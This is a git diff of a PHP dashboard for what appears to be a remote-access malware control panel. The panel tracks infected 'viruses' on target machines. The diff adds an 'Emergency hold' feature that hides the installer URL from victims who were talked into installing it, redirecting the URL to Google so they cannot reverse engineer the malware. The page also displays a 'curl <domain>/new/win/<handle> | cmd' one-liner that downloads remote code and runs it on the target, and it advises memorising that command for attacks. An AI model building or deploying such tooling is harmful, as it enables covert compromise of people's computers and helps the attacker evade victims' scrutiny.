@@ -2,10 +2,10 @@
 
 require_once(__DIR__ . "/../autoload.php");
 
-use Kelvinho\Virus\Header;
-use Kelvinho\Virus\HtmlTemplate;
-use Kelvinho\Virus\Timezone;
-use Kelvinho\Virus\User;
+use Kelvinho\Virus\Singleton\Header;
+use Kelvinho\Virus\Singleton\HtmlTemplate;
+use Kelvinho\Virus\Singleton\Timezone;
+use Kelvinho\Virus\User\User;
 use Kelvinho\Virus\Virus\Virus;
 use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
@@ -47,7 +47,7 @@ if (!$authenticator->authenticated()) {
 }
 
 $user_handle = $session->get("user_handle");
-$user = User::get($user_handle);
+$user = $userFactory->get($user_handle);
 $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
 ?>
 <html lang="en_US">
@@ -64,6 +64,10 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
             border-collapse: collapse;
             padding: 0;
             margin: 0;
+        }
+        .hold {
+            color: blue;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -82,7 +86,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 <h2>Dormant viruses</h2>
 <p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
     than 2 days</p>
-<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory)  {
+<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
     $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
@@ -110,6 +114,20 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
         "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
         "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
 })); ?>
+<h2>Emergency hold</h2>
+<p>Normally, you can install the virus using the command below. What it does is it copies installation instructions from
+    the URL and executes that. However, if you are trying to convince others to willingly install the virus on their
+    computer, they might go to the URL and inspect what's there after they have run it (or before they run it, in which
+    case you're out of luck). They may figure out where the virus is located and may get curious and reverse engineer it
+    and foil your plans. So, this is a way to hide that URL, and redirect it to google if you choose to hold it.</p>
+<?php
+if ($user->isHold()) { ?>
+    <p><span style = "color: red;">You are currently holding, meaning you can't install new viruses</span>. Click <a class = "hold" onclick="removeHold()">here</a> to
+        remove hold.</p>
+<?php } else { ?>
+    <p>You are currently not holding, meaning you can install new viruses but outsiders can reverse engineer the virus.
+        Click <a class = "hold" onclick="applyHold()">here</a> to apply a hold.</p>
+<?php } ?>
 <h2>Installing a new virus</h2>
 To install a new virus on a computer, execute this command in the command prompt running Windows on the target machine:
 <pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/win/<?php echo $user_handle; ?> | cmd</pre>
@@ -117,7 +135,7 @@ And run this for mac (in development):
 <pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
 <p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
     expecting viruses.
-    After a span of time (<?php echo formattedTimeSpan(STARTUP_DELAY); ?>), the virus will pings back for the first
+    After a few seconds, the virus will pings back for the first
     time, and will jump to the active viruses category. If this doesn't happen, then something has gone wrong and I
     have no idea how to fix it. May be the target machine has an antivirus? :D</p>
 <p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
@@ -167,6 +185,26 @@ And run this for mac (in development):
             },
             success: function () {
                 window.location = "<?php echo DOMAIN; ?>";
+            }
+        });
+    }
+
+    function removeHold() {
+        $.ajax({
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/removeHold",
+            type: "POST",
+            success: function () {
+                window.location = "<?php echo DOMAIN_DASHBOARD; ?>";
+            }
+        });
+    }
+
+    function applyHold() {
+        $.ajax({
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/applyHold",
+            type: "POST",
+            success: function () {
+                window.location = "<?php echo DOMAIN_DASHBOARD; ?>";
             }
         });
     }
